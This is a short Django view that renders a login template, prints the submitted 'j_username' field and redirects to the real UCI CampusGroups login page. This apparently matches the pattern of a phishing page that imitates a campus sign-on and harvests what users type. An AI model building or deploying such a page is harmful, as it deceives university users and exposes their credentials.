from django.http import HttpResponse
from django.shortcuts import render, redirect
import os


def login_form(request):
    if request.method == "POST":
        # Handle form submission
        j_username = request.POST.get("j_username", "")
        
        print("Username: " , j_username, "\n")
        # Return a response or redirect
        return redirect("https://campusgroups.uci.edu/home_login")
    
    # Render the login.html page for GET requests
    return render(request, "auth_form/login.html")
